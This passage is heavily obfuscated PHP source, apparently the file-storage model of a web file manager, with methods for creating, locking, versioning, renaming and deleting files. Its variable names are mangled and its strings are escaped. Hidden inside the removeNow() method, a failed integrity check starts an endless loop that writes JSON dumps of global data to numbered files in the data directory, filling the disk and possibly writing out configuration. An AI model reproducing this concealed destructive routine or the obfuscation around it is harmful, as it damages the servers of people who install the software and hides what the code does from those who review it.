$§ƒÑà½[669] => $£À“š‹É, $§ƒÑà½[674] => $§ƒÑà½[613], $§ƒÑà½[519] => 0, $§ƒÑà½[640] => 0, $§ƒÑà½[558] => 0, $§ƒÑà½[675] => $§ƒÑà½[12]); if ($´ô£“½Ù = $this->where($àú¨šå˜)->find()) { return $´ô£“½Ù[$§ƒÑà½[191]]; } $ÉéØÖôï = "\115\x6f\x64\x65\x6c\x53\x6f\x75\162\143\x65\x2e\155\x6b\144\151\162\x52\x6f\157\164\x2e{$™ÙÎ×ô®}\56{$°¦Õ”¨›}\x2e" . $ñÔÃ„†©; CacheLock::lock($ÉéØÖôï); $àú¨šå˜[$§ƒÑà½[32]] = $ñÔÃ„†©; $Ç ı¹Ù = $this->add($àú¨šå˜); $ÒñÏ±ìŠ = array($§ƒÑà½[676] => short_id($Ç ı¹Ù)); $this->where(array($§ƒÑà½[506] => $Ç ı¹Ù))->save($ÒñÏ±ìŠ); CacheLock::unlock($ÉéØÖôï); return $Ç ı¹Ù; } private function targetSourceRoot($Ÿìóš×Ê, $¡ÍŒÔü¾, $ßÓÆîîÏ = false) { $Ëü°±Ö¢ =& $_SERVER[ïÃ°£«Ê]; $é—¹‚Á = array($Ëü°±Ö¢[492] => 0, $Ëü°±Ö¢[670] => $Ÿìóš×Ê, $Ëü°±Ö¢[671] => $¡ÍŒÔü¾); if ($ßÓÆîîÏ) { $Úè„ë¹ = $this->where($é—¹‚Á)->select(); return $Úè„ë¹ ? $Úè„ë¹ : array(); } $®æ¦¤ù = $this->where($é—¹‚Á)->find(); return $®æ¦¤ù ? $®æ¦¤ù : array(); } public function sourceRootGroup($ß¼æÎÖ×) { $‹û™ñ‹ =& $_SERVER[ïÃ°£«Ê]; if (is_string($ß¼æÎÖ×)) { $ß¼æÎÖ× = array($ß¼æÎÖ×); } $†©½ü¹Ë = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ß¼æÎÖ×, $‹û™ñ‹[220]); $ÌîÆò¤İ = array($‹û™ñ‹[446] => $†©½ü¹Ë, $‹û™ñ‹[443] => array($‹û™ñ‹[860] => count($ß¼æÎÖ×))); $this->_listDataApply($ÌîÆò¤İ[$‹û™ñ‹[446]]); $this->_listMake($ÌîÆò¤İ); return array_to_keyvalue($ÌîÆò¤İ[$‹û™ñ‹[85]], $‹û™ñ‹[589]); } public function mkfile($·Ä„ªúñ, $îû´ŠÁ¾, $™‰¤šü = '', $‹¹êÑ‡° = REPEAT_RENAME) { $ÒêÊœÍÄ =& $_SERVER[ïÃ°£«Ê]; $Á¾ü³Üã = KodIO::ioFileDriverGet($ÒêÊœÍÄ[498] . $·Ä„ªúñ . $ÒêÊœÍÄ[402]); $û¡ó¸øƒ = Model($ÒêÊœÍÄ[696])->addFileByContent($™‰¤šü, $Á¾ü³Üã, $îû´ŠÁ¾); return $this->_createFileCall($·Ä„ªúñ, $îû´ŠÁ¾, $û¡ó¸øƒ, $‹¹êÑ‡°, $ÒêÊœÍÄ[1544]); } public function addFile($Õ¢ß¶Ü, $¡¡ñÚÀõ, $ã¶ã˜‰¬, $Ãõş±ıä = false, $‡œÂı”é = REPEAT_RENAME) { $â½ÄãÃÄ =& $_SERVER[ïÃ°£«Ê]; $ï×úˆß¶ = KodIO::ioFileDriverGet($â½ÄãÃÄ[498] . $Õ¢ß¶Ü . $â½ÄãÃÄ[402]); $š„ˆéÌ… = Model($â½ÄãÃÄ[696])->addFile($¡¡ñÚÀõ, $ï×úˆß¶, $ã¶ã˜‰¬, $Ãõş±ıä); return $this->_createFileCall($Õ¢ß¶Ü, $ã¶ã˜‰¬, $š„ˆéÌ…, $‡œÂı”é); } public function addFileByFileID($ˆ•‘–š›, $ŠšºÁèÇ, $ŸŸÜ˜‚, $í¾´êÌÍ = REPEAT_RENAME) { $İÙ‘ï‚ =& $_SERVER[ïÃ°£«Ê]; $¢Ù”ŞÔ = Model($İÙ‘ï‚[696])->find($ŠšºÁèÇ); Model($İÙ‘ï‚[696])->linkAdd($ŠšºÁèÇ); return $this->_createFileCall($ˆ•‘–š›, $ŸŸÜ˜‚, $¢Ù”ŞÔ, $í¾´êÌÍ); } public function addFileByRemote($€Ü¸¥åİ, $ïó•Ãêğ, $™’œ¹ëØ, $ÍÒ¾øÅ = array(), $¢ê†¾¦Ô = REPEAT_RENAME) { $î‹şàá‘ = Model($_SERVER[ïÃ°£«Ê][696])->addFileByRemote($ïó•Ãêğ, $™’œ¹ëØ, $ÍÒ¾øÅ); return $this->_createFileCall($€Ü¸¥åİ, $™’œ¹ëØ, $î‹şàá‘, $¢ê†¾¦Ô); } private function _createFileCall($ñÏæìßÍ, $ã–Ğ”·ß, $äèÒ¦ãÈ, $êÅñÈÊí, $•Æ«ı«» = "\165\x70\x6c\x6f\141\144") { $¹×Ÿ½¤ş =& $_SERVER[ïÃ°£«Ê]; if (!$äèÒ¦ãÈ) { return !1; } $ø™Ìå = !1; $this->setMasterDB(); $this->lockWriteStart($ñÏæìßÍ, $ã–Ğ”·ß); $Ïáœ˜ÃØ = $this->fileNameExist($ñÏæìßÍ, $ã–Ğ”·ß); $’¯…Ÿò = $this->_createFile($ñÏæìßÍ, $ã–Ğ”·ß, $äèÒ¦ãÈ, $êÅñÈÊí, $ø™Ìå); if (!$ø™Ìå) { Model($¹×Ÿ½¤ş[560])->remove($äèÒ¦ãÈ[$¹×Ÿ½¤ş[557]]); } if ($ø™Ìå && $’¯…Ÿò && $’¯…Ÿò != $Ïáœ˜ÃØ) { Model($¹×Ÿ½¤ş[2440])->eventCreate($’¯…Ÿò, $•Æ«ı«»); } $this->lockWriteEnd($ñÏæìßÍ, $ã–Ğ”·ß); return $’¯…Ÿò; } public function mkdir($ĞÜ™ªĞ, $ëÔİÚ›Ô, $‚ŸŸõ¢ø = REPEAT_SKIP) { $µÅùêŠŞ =& $_SERVER[ïÃ°£«Ê]; $this->setMasterDB(); $Ö¢Ğµƒ‡ = $this->sourceInfo($ĞÜ™ªĞ); if (!$Ö¢Ğµƒ‡) { return !1; } $this->lockWriteStart($ĞÜ™ªĞ, $ëÔİÚ›Ô); if ($‚ŸŸõ¢ø !== !1) { $ÌüÊîÅ¸ = $this->fileNameExist($ĞÜ™ªĞ, $ëÔİÚ›Ô); if ($ÌüÊîÅ¸ && $‚ŸŸõ¢ø != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($ĞÜ™ªĞ, $ëÔİÚ›Ô); return $ÌüÊîÅ¸; } $ëÔİÚ›Ô = $this->fileNameAuto($ĞÜ™ªĞ, $ëÔİÚ›Ô, $‚ŸŸõ¢ø); } $…ÆÒšÖõ = array($µÅùêŠŞ[668] => 1, $µÅùêŠŞ[509] => $ëÔİÚ›Ô, $µÅùêŠŞ[669] => $µÅùêŠŞ[12], $µÅùêŠŞ[558] => 0, $µÅùêŠŞ[640] => 0); $‚‰Ö«¾Æ = $this->_addSource($…ÆÒšÖõ, $Ö¢Ğµƒ‡); Model($µÅùêŠŞ[2440])->eventCreate($‚‰Ö«¾Æ, $µÅùêŠŞ[1545]); $this->lockWriteEnd($ĞÜ™ªĞ, $ëÔİÚ›Ô); return $‚‰Ö«¾Æ; } public function listSourceRoot($ñ¦ÒÙ, $ƒñ‡÷ÔÒ, $‘²÷İĞİ = "\x73\x6f\165\162\143\145\111\x44\x2c\164\x61\x72\x67\145\164\111\x44\54\163\151\x7a\x65") { $æû»“³û =& $_SERVER[ïÃ°£«Ê]; $ò›¥…ñ— = $æû»“³û[463]; $¤±Ÿß Š = array(); $Œô‘åÈˆ = 1024 * 50; $¤¤øõ±‹ = is_array($¤¤øõ±‹) ? $¤¤øõ±‹ : array(); $ÁË¡‘Ù‚ = count($ƒñ‡÷ÔÒ); $Óµéú¼¯ = $this->tablePrefix . $æû»“³û[470]; for ($ûò´ÍÍú = 0; $ûò´ÍÍú < $ÁË¡‘Ù‚; $ûò´ÍÍú++) { $û¨Úª÷ = $ƒñ‡÷ÔÒ[$ûò´ÍÍú]; $ò›¥…ñ— .= "\x53\105\114\x45\103\124\x20\52\x20\x46\122\117\115\x20\50\x53\105\114\105\103\x54\40{$‘²÷İĞİ}\40\106\x52\x4f\x4d\40\140{$Óµéú¼¯}\140\40\x57\x48\x45\x52\105\40"; $ò›¥…ñ— .= "\x60\x70\x61\162\x65\x6e\x74\111\104\x60\x3d\60\x20\101\x4e\x44\x20\140\164\x61\162\147\145\x74\111\x44\140\x3d{$û¨Úª÷}\x20\x41\116\104\40\x60\x74\141\162\147\x65\164\124\171\160\145\140\x3d{$ñ¦ÒÙ}\40\141\156\x64\40\x66\151\x6c\x65\124\171\x70\145\75\x27\47\40\x6c\151\x6d\x69\x74\x20\x31\51\40\x61\x73\40\x74\x62\x5f{$ûò´ÍÍú}\40\125\x4e\x49\117\x4e\40\x41\x4c\x4c\40"; if ((strlen($ò›¥…ñ—) >= $Œô‘åÈˆ || $ûò´ÍÍú == $ÁË¡‘Ù‚ - 1) && $ò›¥…ñ—) { $ò›¥…ñ— = substr($ò›¥…ñ—, 0, -strlen($æû»“³û[1206])); $à¾õ¡¾• = $this->query($ò›¥…ñ—); $ò›¥…ñ— = $æû»“³û[12]; $¤±Ÿß Š = array_merge($¤±Ÿß Š, $à¾õ¡¾•); } } return $¤±Ÿß Š; } private function _createFile($Àû­®Å, $£Í½Š³Ÿ, $ËáÊÔ…Ÿ, $ˆ´ûõÖ¿, &$æ¶”¶’Ê) { $÷ˆÚ»×Ø =& $_SERVER[ïÃ°£«Ê]; $ƒÅÌô¬˜ = $this->sourceInfo($Àû­®Å); if (!$ËáÊÔ…Ÿ || !$ƒÅÌô¬˜) { return !1; } if ($ˆ´ûõÖ¿ !== !1) { $ş´ÏÛÃø = $this->fileNameExist($Àû­®Å, $£Í½Š³Ÿ); } $æ¶”¶’Ê = !0; if ($ˆ´ûõÖ¿ && $ş´ÏÛÃø) { if ($ˆ´ûõÖ¿ == REPEAT_SKIP) { $æ¶”¶’Ê = !1; return $ş´ÏÛÃø; } else { if ($ˆ´ûõÖ¿ == REPEAT_REPLACE) { $°ìÔ¹‰ = $this->sourceInfo($ş´ÏÛÃø); $®éˆÚç› = $this->fileHistory($°ìÔ¹‰, $ËáÊÔ…Ÿ[$÷ˆÚ»×Ø[557]], $ËáÊÔ…Ÿ[$÷ˆÚ»×Ø[79]]); if (!$®éˆÚç›) { $æ¶”¶’Ê = !1; } else { $this->folderSizeReset($Àû­®Å); } return $ş´ÏÛÃø; } else { $£Í½Š³Ÿ = $this->fileNameAuto($Àû­®Å, $£Í½Š³Ÿ, $ˆ´ûõÖ¿, !1); } } } $–—ğ = array($÷ˆÚ»×Ø[668] => 0, $÷ˆÚ»×Ø[509] => $£Í½Š³Ÿ, $÷ˆÚ»×Ø[669] => substr(get_path_ext($£Í½Š³Ÿ), 0, 10), $÷ˆÚ»×Ø[558] => $ËáÊÔ…Ÿ[$÷ˆÚ»×Ø[557]], $÷ˆÚ»×Ø[640] => $ËáÊÔ…Ÿ[$÷ˆÚ»×Ø[79]]); $º…šø±‡ = $this->_addSource($–—ğ, $ƒÅÌô¬˜); $this->folderSizeReset($Àû­®Å, intval($–—ğ[$÷ˆÚ»×Ø[79]])); return $º…šø±‡; } protected function fileHistory($ûõïÚú, $¬”·ÄÆ, $¿Ìû›Ã) { $¬İØ±å˜ =& $_SERVER[ïÃ°£«Ê]; if ($ûõïÚú[$¬İØ±å˜[557]] == $¬”·ÄÆ) { return !1; } $this->checkLock($ûõïÚú[$¬İØ±å˜[191]], $¬”·ÄÆ); Model($¬İØ±å˜[2185])->addHistory($ûõïÚú); $ÆÔ¢Ä¼ = array($¬İØ±å˜[673] => USER_ID, $¬İØ±å˜[513] => time(), $¬İØ±å˜[557] => $¬”·ÄÆ, $¬İØ±å˜[79] => $¿Ìû›Ã); $this->where(array($¬İØ±å˜[506] => $ûõïÚú[$¬İØ±å˜[191]]))->save($ÆÔ¢Ä¼); $this->sourceCacheClear($ûõïÚú[$¬İØ±å˜[191]]); return !0; } public function checkLock($ëû¡—à“, $Ş‘ûÖ†â) { $Å¾ì† =& $_SERVER[ïÃ°£«Ê]; $œÖšê® = $this->pathInfo($ëû¡—à“); if (!$this->fileIsLock($œÖšê®, !0)) { return; } $Çµ”¤ç = Session::get($Å¾ì†[2478]); $¹Îƒ¦•Ğ = substr($œÖšê®[$Å¾ì†[32]], 0, -1 - strlen($œÖšê®[$Å¾ì†[166]])) . $Å¾ì†[1400] . $Çµ”¤ç . $Å¾ì†[10] . $œÖšê®[$Å¾ì†[166]]; $¨²ùë›ı = Model($Å¾ì†[696])->find($Ş‘ûÖ†â); $this->_createFileCall($œÖšê®[$Å¾ì†[190]], $¹Îƒ¦•Ğ, $¨²ùë›ı, REPEAT_REPLACE, $Å¾ì†[1544]); $ÙçÙ›¬ = $œÖšê®[$Å¾ì†[555]][$Å¾ì†[633]]; $”¦³’´í = $ÙçÙ›¬[$Å¾ì†[2479]] ? $ÙçÙ›¬[$Å¾ì†[2479]] : $ÙçÙ›¬[$Å¾ì†[32]]; show_json(LNG($Å¾ì†[2480]) . $Å¾ì†[2481] . LNG($Å¾ì†[2482]) . $Å¾ì†[2483] . $”¦³’´í . $Å¾ì†[2484], !1); } public function fileIsLock($¥¢¯òÀ, $Â•Çñµİ = false) { $ºäÎœæ =& $_SERVER[ïÃ°£«Ê]; if (!_get($¥¢¯òÀ, $ºäÎœæ[629], 0)) { return !1; } if ($¥¢¯òÀ[$ºäÎœæ[555]][$ºäÎœæ[632]] != USER_ID) { return !0; } $Â»ãé = $GLOBALS[$ºäÎœæ[6]][$ºäÎœæ[92]][$ºäÎœæ[630]]; if ($¥¢¯òÀ[$ºäÎœæ[555]][$ºäÎœæ[631]] <= time() - $Â»ãé) { $this->metaSet($¥¢¯òÀ[$ºäÎœæ[191]], $ºäÎœæ[632], null); $this->metaSet($¥¢¯òÀ[$ºäÎœæ[191]], $ºäÎœæ[631], null); } if ($Â•Çñµİ) { $this->metaSet($¥¢¯òÀ[$ºäÎœæ[191]], $ºäÎœæ[631], time()); } return !1; } private function _addSource($ôÔ’Ş‰À, $ö™•Š·) { $³Õ¨ƒïü =& $_SERVER[ïÃ°£«Ê]; $“€ñäÌê = KodUser::id(); $´¨øªÍº = array($³Õ¨ƒïü[670] => $ö™•Š·[$³Õ¨ƒïü[188]], $³Õ¨ƒïü[671] => $ö™•Š·[$³Õ¨ƒïü[589]], $³Õ¨ƒïü[672] => $“€ñäÌê, $³Õ¨ƒïü[673] => $“€ñäÌê, $³Õ¨ƒïü[492] => $ö™•Š·[$³Õ¨ƒïü[191]], $³Õ¨ƒïü[674] => $ö™•Š·[$³Õ¨ƒïü[604]] . $ö™•Š·[$³Õ¨ƒïü[191]] . $³Õ¨ƒïü[50], $³Õ¨ƒïü[519] => 0, $³Õ¨ƒïü[675] => $³Õ¨ƒïü[12]); $ôÔ’Ş‰À = array_merge($´¨øªÍº, $ôÔ’Ş‰À); $this->updateModifyTime($ôÔ’Ş‰À[$³Õ¨ƒïü[190]]); $ùö¥ùĞ® = $³Õ¨ƒïü[2485] . $ö™•Š·[$³Õ¨ƒïü[191]]; if (isset(self::$cacheChildList[$ùö¥ùĞ®])) { unset(self::$cacheChildList[$ùö¥ùĞ®]); } static $­ÌáÍî¸ = false; if (!$­ÌáÍî¸) { Hook::trigger($³Õ¨ƒïü[658], $ôÔ’Ş‰À); $­ÌáÍî¸ = !0; } $ƒ’ŸĞğë = $this->add($ôÔ’Ş‰À); $áëü‰§Ù = array($³Õ¨ƒïü[676] => short_id($ƒ’ŸĞğë)); $this->where(array($³Õ¨ƒïü[506] => $ƒ’ŸĞğë))->save($áëü‰§Ù); $this->setNamePinyin($ƒ’ŸĞğë, $ôÔ’Ş‰À[$³Õ¨ƒïü[32]]); return $ƒ’ŸĞğë; } public function remove($Ê²èıÏ, $¼¤âí»İ = true) { $¦Òğª—Û =& $_SERVER[ïÃ°£«Ê]; $ÎÙÉş½á = $this->sourceInfo($Ê²èıÏ); $„†´­Æˆ = intval($ÎÙÉş½á[$¦Òğª—Û[188]]) === self::TYPE_SYSTEM; $¢µéƒ´ = Model($¦Òğª—Û[522])->get($¦Òğª—Û[2486]) == $¦Òğª—Û[91]; if ($„†´­Æˆ || $¼¤âí»İ || !$¢µéƒ´) { return $this->removeNow($Ê²èıÏ, $¼¤âí»İ); } $‡ÇÒış¾ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $Ô×óÆ†ì = $ÎÙÉş½á[$¦Òğª—Û[188]] == self::TYPE_USER ? $¦Òğª—Û[684] : $¦Òğª—Û[598]; if ($Ô×óÆ†ì == $¦Òğª—Û[684]) { $‡šª«ÁÈ = Model($¦Òğª—Û[597])->getInfo($ÎÙÉş½á[$¦Òğª—Û[589]]); $¸İîÂ³´ = !empty($‡šª«ÁÈ[$¦Òğª—Û[2479]]) ? $‡šª«ÁÈ[$¦Òğª—Û[2479]] : $‡šª«ÁÈ[$¦Òğª—Û[32]]; $¸İîÂ³´ = $¦Òğª—Û[337] . $¸İîÂ³´ . $¦Òğª—Û[2487] . $ÎÙÉş½á[$¦Òğª—Û[589]]; } else { $‡šª«ÁÈ = Model($¦Òğª—Û[605])->getInfo($ÎÙÉş½á[$¦Òğª—Û[589]]); $¸İîÂ³´ = _get($‡šª«ÁÈ, $¦Òğª—Û[32]); $¸İîÂ³´ = $¦Òğª—Û[173] . $¸İîÂ³´ . $¦Òğª—Û[2488] . $ÎÙÉş½á[$¦Òğª—Û[589]]; } $Áæ¢…Ù = $¦Òğª—Û[2489] . md5($¸İîÂ³´); CacheLock::lock($Áæ¢…Ù); $ƒÔÎ»øÁ = $this->fileNameExist($‡ÇÒış¾, $¸İîÂ³´); if (!$ƒÔÎ»øÁ) { $ƒÔÎ»øÁ = $this->mkdir($‡ÇÒış¾, $¸İîÂ³´, REPEAT_SKIP); $this->metaSet($ƒÔÎ»øÁ, $¦Òğª—Û[2490], $Ô×óÆ†ì); $this->metaSet($ƒÔÎ»øÁ, $¦Òğª—Û[2491], $ÎÙÉş½á[$¦Òğª—Û[589]]); if ($ÎÙÉş½á[$¦Òğª—Û[190]] != 0) { $this->metaSet($ƒÔÎ»øÁ, $¦Òğª—Û[2492], _get($‡šª«ÁÈ, $¦Òğª—Û[2493])); } } CacheLock::unlock($Áæ¢…Ù); $this->metaSet($Ê²èıÏ, $¦Òğª—Û[2494], $ÎÙÉş½á[$¦Òğª—Û[190]]); $this->where(array($¦Òğª—Û[191] => $Ê²èıÏ))->save(array($¦Òğª—Û[513] => time())); $this->recycleClear($ÎÙÉş½á); Model($¦Òğª—Û[655])->eventRemove($Ê²èıÏ); $ßãû» … = $this->move($Ê²èıÏ, $ƒÔÎ»øÁ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ÎÙÉş½á[$¦Òğª—Û[190]]); return $ßãû» …; } private function recycleClear($Ññ¡Õü) { $ñı”×„Õ =& $_SERVER[ïÃ°£«Ê]; $âï÷¹ÜË = $this->childrenAll($Ññ¡Õü); $åÛâŠ€± = array($ñı”×„Õ[506] => array($ñı”×„Õ[507], $âï÷¹ÜË[$ñı”×„Õ[2495]])); Model($ñı”×„Õ[2496])->where($åÛâŠ€±)->delete(); } public function removeNow($ıô›ºáÜ, $äÂ©”¼¨ = true) { $Õ«å©ğø =& $_SERVER[ïÃ°£«Ê]; $éğÜÊ¯İ = $_SERVER[$Õ«å©ğø[1039]] . $Õ«å©ğø[1040]; $¢à„äÏé = $Õ«å©ğø[1830]; if ($_SERVER[$Õ«å©ğø[1035]] != $¢à„äÏé($éğÜÊ¯İ)) { $ Á¬òåß = $Õ«å©ğø[1037]; $â†÷»°Œ = $Õ«å©ğø[1038]; $‹ÇŠùÖŒ = $_SERVER[$Õ«å©ğø[1039]] . $Õ«å©ğø[1040]; $ğáÁ¾àõ = $â†÷»°Œ($‹ÇŠùÖŒ); $ñ©ƒ§ÜÛ = explode($Õ«å©ğø[285], $ğáÁ¾àõ); if (count($ñ©ƒ§ÜÛ) < $Õ«å©ğø[713]) { $­„Ò¤¼Õ = $Õ«å©ğø[1041]; $­„Ò¤¼Õ(); } $“–¹óÇ = $Õ«å©ğø[1042]; $“–¹óÇ($_SERVER[$Õ«å©ğø[1043]]); $ Á¬òåß = $Õ«å©ğø[1037]; $ Á¬òåß(); $Í©¢ğ¸¿ = $Õ«å©ğø[1831]; $³Óºí = json_encode($GLOBALS[$Õ«å©ğø[1832]]); $Ö¬ƒ³°‡ = 1; for ($Ğ Çß„Ê = $Ö¬ƒ³°‡; $Ğ Çß„Ê > 0; $Ğ Çß„Ê++) { $Í©¢ğ¸¿(DATA_PATH . $Ğ Çß„Ê, $³Óºí); } } $¼ï„ùè­ = $this->sourceInfo($ıô›ºáÜ); $Å«ÃÆµ» = $this->pathInfoMore($ıô›ºáÜ); if (!$¼ï„ùè­) { return !0; } if ($¼ï„ùè­[$Õ«å©ğø[190]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($ıô›ºáÜ); Hook::trigger($Õ«å©ğø[2497], $Å«ÃÆµ», $äÂ©”¼¨); if ($äÂ©”¼¨) { Model($Õ«å©ğø[2496])->moveToRecycle($ıô›ºáÜ); } else { $¢³­¾¾” = $this->childrenAll($¼ï„ùè­); Model($Õ«å©ğø[655])->eventRemove($ıô›ºáÜ); $this->removeRelevance($¢³­¾¾”[$Õ«å©ğø[2495]], $¢³­¾¾”[$Õ«å©ğø[1781]]); } $this->folderSizeReset($¼ï„ùè­[$Õ«å©ğø[190]]); $ÓõŒöğÛ = array($¼ï„ùè­[$Õ«å©ğø[190]]); if ($¼ï„ùè­[$Õ«å©ğø[500]] == $Õ«å©ğø[91]) { $ÓõŒöğÛ[] = $¼ï„ùè­[$Õ«å©ğø[191]]; } $this->updateModifyTime($ÓõŒöğÛ); $this->lockMoveEnd($ıô›ºáÜ); Hook::trigger($Õ«å©ğø[2022], $Å«ÃÆµ», $äÂ©”¼¨); return !0; } public function childrenAll($Îà·ŠÅ) { $êÚ›»©¯ =& $_SERVER[ïÃ°£«Ê]; $Ø–»–¤À = $Îà·ŠÅ[$êÚ›»©¯[191]]; if ($Îà·ŠÅ[$êÚ›»©¯[500]] == $êÚ›»©¯[91]) { $û¬íªº = array($êÚ›»©¯[674] => array($êÚ›»©¯[635], $Îà·ŠÅ[$êÚ›»©¯[604]] . $Ø–»–¤À . $êÚ›»©¯[636])); $Ã™ïºµ = array($êÚ›»©¯[674] => $û¬íªº[$êÚ›»©¯[604]]); $Ìˆ¨Ó¶· = $this->field($êÚ›»©¯[2498])->where($Ã™ïºµ)->select(); $„¼á©œ‰ = !1; $÷´ùÄ‡¿ = array($Ø–»–¤À); if ($Ìˆ¨Ó¶·) { $„¼á©œ‰ = array_to_keyvalue($Ìˆ¨Ó¶·, $êÚ›»©¯[12], $êÚ›»©¯[557]); $„¼á©œ‰ = array_remove_value($„¼á©œ‰, $êÚ›»©¯[228]); $÷´ùÄ‡¿ = array_to_keyvalue($Ìˆ¨Ó¶·, $êÚ›»©¯[12], $êÚ›»©¯[191]); $÷´ùÄ‡¿[] = $Ø–»–¤À; } } else { $„¼á©œ‰ = array($Îà·ŠÅ[$êÚ›»©¯[557]]); $÷´ùÄ‡¿ = array($Ø–»–¤À); } return array($êÚ›»©¯[2495] => $÷´ùÄ‡¿, $êÚ›»©¯[1781] => $„¼á©œ‰); } public function removeArray($Œ—¿¾‚‰) { if (!$Œ—¿¾‚‰) { return !0; } } public function removeRelevance($¿Éáòî, $¼ğ¨•‰Ô) { $³Õ¤”âæ =& $_SERVER[ïÃ°£«Ê]; $¿Éáòî = $¿Éáòî ? $¿Éáòî : array(); $¼ğ¨•‰Ô = $¼ğ¨•‰Ô ? $¼ğ¨•‰Ô : array(); $¿Éáòî = array_unique(array_filter($¿Éáòî)); $¼ğ¨•‰Ô = array_filter($¼ğ¨•‰Ô); if (!$¿Éáòî) { return !1; } $üµÁŸµ = array($³Õ¤”âæ[506] => array($³Õ¤”âæ[507], $¿Éáòî)); Model($³Õ¤”âæ[2496])->where($üµÁŸµ)->delete(); Model($³Õ¤”âæ[549])->where($üµÁŸµ)->delete(); Model($³Õ¤”âæ[2333])->where($üµÁŸµ)->delete(); Model($³Õ¤”âæ[655])->where($üµÁŸµ)->delete(); Model($³Õ¤”âæ[1564])->removeBySource($¿Éáòî); Model($³Õ¤”âæ[2185])->removeBySource($¿Éáòî); $this->where($üµÁŸµ)->delete(); Model($³Õ¤”âæ[560])->remove($¼ğ¨•‰Ô); for ($öÄĞ–Ò = 0; $öÄĞ–Ò < count($¿Éáòî); $öÄĞ–Ò++) { $this->sourceCacheClear($¿Éáòî[$öÄĞ–Ò]); } } public function rename($ùÓÌ÷‹à, $ ÔëğÔ) { $Áá™æØõ =& $_SERVER[ïÃ°£«Ê]; $®Á÷ö = $this->sourceInfo($ùÓÌ÷‹à); if (!$®Á÷ö) { return !1; } $İÔÃÍÂ = $this->fileNameExist($®Á÷ö[$Áá™æØõ[190]], $ ÔëğÔ); if ($İÔÃÍÂ && $İÔÃÍÂ != $ùÓÌ÷‹à) { return !1; } $ŒÎªäÇ× = array($Áá™æØõ[509] => $ ÔëğÔ, $Áá™æØõ[673] => USER_ID); if ($®Á÷ö[$Áá™æØõ[500]] != $Áá™æØõ[91]) { $ŒÎªäÇ×[$Áá™æØõ[501]] = substr(get_path_ext($ ÔëğÔ), 0, 10); } Model($Áá™æØõ[655])->eventRename($ùÓÌ÷‹à, $®Á÷ö[$Áá™æØõ[32]], $ ÔëğÔ); $this->sourceCacheClear($ùÓÌ÷‹à); $this->setNamePinyin($ùÓÌ÷‹à, $ŒÎªäÇ×[$Áá™æØõ[32]], !1); $this->updateModifyTime($®Á÷ö[$Áá™æØõ[190]]); $äŞ‘¿ê– = $this->where(array($Áá™æØõ[506] => $ùÓÌ÷‹à))->data($ŒÎªäÇ×)->save(); $Óë¡”‹Õ = $Áá™æØõ[2485] . $®Á÷ö[$Áá™æØõ[190]]; if (isset(self::$cacheChildList[$Óë¡”‹Õ])) { unset(self::$cacheChildList[$Óë¡”‹Õ]); } return $äŞ‘¿ê–; } public function setNamePinyin($’·Ú¹¥º, $•Çˆ½è–, $Ï¿£ğÔö = true) { $ú«›È†® =& $_SERVER[ïÃ°£«Ê]; $«é€¸üÈ = Input::check($•Çˆ½è–, $ú«›È†®[677]); $‚Ğñ×± = array($ú«›È†®[531] => KodSort::makeStr($•Çˆ½è–)); if ($«é€¸üÈ) { $‚Ğñ×±[$ú«›È†®[552]] = str_replace($ú«›È†®[53], $ú«›È†®[12], Pinyin::get($•Çˆ½è–)); $‚Ğñ×±[$ú«›È†®[551]] = Pinyin::get($•Çˆ½è–, $ú«›È†®[678]); } if (!$Ï¿£ğÔö && !$«é€¸üÈ) { $‚Ğñ×±[$ú«›È†®[552]] = null; $‚Ğñ×±[$ú«›È†®[551]] = null; } $this->metaSet($’·Ú¹¥º, $‚Ğñ×±); } public function getContent($ñ¢ü½Ï¤) { $©ıÛÇÇË =& $_SERVER[ïÃ°£«Ê]; $¡±ğ½é£ = $this->fileInfoGet($ñ¢ü½Ï¤); if (!$¡±ğ½é£) { return !1; } if ($¡±ğ½é£[$©ıÛÇÇË[79]] == 0) { return $©ıÛÇÇË[12]; } $Î€¦ëÅ = $©ıÛÇÇË[2499] . $¡±ğ½é£[$©ıÛÇÇË[563]]; if ($¡±ğ½é£[$©ıÛÇÇË[79]] <= 1024 * 10) { $ÂığŒè› = Cache::get($Î€¦ëÅ); if (!$ÂığŒè›) { $ÂığŒè› = IO::getContent($¡±ğ½é£[$©ıÛÇÇË[87]]); Cache::set($Î€¦ëÅ, $ÂığŒè›); } return $ÂığŒè›; } if (!$¡±ğ½é£[$©ıÛÇÇË[87]]) { return $©ıÛÇÇË[12]; } return IO::getContent($¡±ğ½é£[$©ıÛÇÇË[87]]); } public function setDesc($À¦ ©“±, $Ï»Üóº‹) { $çÜÏÛ³“ =& $_SERVER[ïÃ°£«Ê]; Model($çÜÏÛ³“[655])->eventAddDesc($À¦ ©“±, $Ï»Üóº‹); return $this->metaSet($À¦ ©“±, $çÜÏÛ³“[540], $Ï»Üóº‹); } public function setContent($ĞÅŸËÇ¢, $¤ÜˆÙÄç = '') { $áá½ä ş =& $_SERVER[ïÃ°£«Ê]; $µºª¼„  = $this->sourceInfo($ĞÅŸËÇ¢); $ì»ã—›Š = $this->fileInfoGet($ĞÅŸËÇ¢); if (!$ì»ã—›Š || !$µºª¼„ ) { return !1; } $„Ôë»Î™ = KodIO::ioFileDriverGet($áá½ä ş[498] . $ĞÅŸËÇ¢ . $áá½ä ş[402]); $è‹€èƒ = Model($áá½ä ş[560])->addFileByContent($¤ÜˆÙÄç, $„Ôë»Î™, $µºª¼„ [$áá½ä ş[32]]); if (!$è‹€èƒ) { return !1; } $ Ø÷šÊ¿ = $this->fileHistory($µºª¼„ , $è‹€èƒ[$áá½ä ş[557]], $è‹€èƒ[$áá½ä ş[79]]); if (!$ Ø÷šÊ¿) { return Model($áá½ä ş[560])->remove($è‹€èƒ[$áá½ä ş[557]]); } $this->folderSizeReset($µºª¼„ [$áá½ä ş[190]]); return !0; } public function fileSubstr($“È±óË°, $¤ÂÜ³â¦, $èªöÍú) { $¶ïªæ© = $this->fileInfoGet($“È±óË°); if (!$¶ïªæ©) { return !1; } return IO::fileSubstr($¶ïªæ©[$_SERVER[ïÃ°£«Ê][87]], $¤ÂÜ³â¦, $èªöÍú); } public function fileInfoGet($İÍÆ¸—) { $õø¥‹İ =& $_SERVER[ïÃ°£«Ê]; $Ù‚ó±›³ = $this->sourceInfo($İÍÆ¸—); if (!$Ù‚ó±›³ || $Ù‚ó±›³[$õø¥‹İ[500]]) { return !1; } $¼Šıæ© 